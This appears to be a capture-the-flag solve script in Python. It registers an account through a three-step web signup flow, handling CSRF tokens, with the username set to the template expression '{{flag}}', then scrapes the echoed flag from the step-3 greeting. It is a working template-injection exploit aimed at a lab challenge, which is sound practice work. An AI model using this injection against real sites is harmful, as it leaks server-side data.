import re
import requests
import sys

'''
@文件命名：X-025-24
@使用方式: python X-025-24.py url
@简述思路: 走注册三步流程，用户名填入 {{flag}}，在 step3 的提示中直接回显 flag。
'''


def Scan(url):
    s = requests.Session()

    r = s.get(f"{url}/accounts/register/step1/")
    csrf = re.search(r'name=\"csrfmiddlewaretoken\" value=\"([^\"]+)\"', r.text).group(1)
    s.post(f"{url}/accounts/register/step1/",
           data={"csrfmiddlewaretoken": csrf, "name": "{{flag}}", "password": "1234567890a"},
           headers={"Referer": f"{url}/accounts/register/step1/"})

    r = s.get(f"{url}/accounts/register/step2/")
    csrf = re.search(r'name=\"csrfmiddlewaretoken\" value=\"([^\"]+)\"', r.text).group(1)
    s.post(f"{url}/accounts/register/step2/",
           data={"csrfmiddlewaretoken": csrf, "email": "ctfer@example.com"},
           headers={"Referer": f"{url}/accounts/register/step2/"})

    r = s.get(f"{url}/accounts/register/step3/")
    flag = re.search(r'Hello (.*?)\. Just Now up to 50% OFF', r.text).group(1)
    return flag


if __name__ == '__main__':
    print(Scan(url=sys.argv[1]))
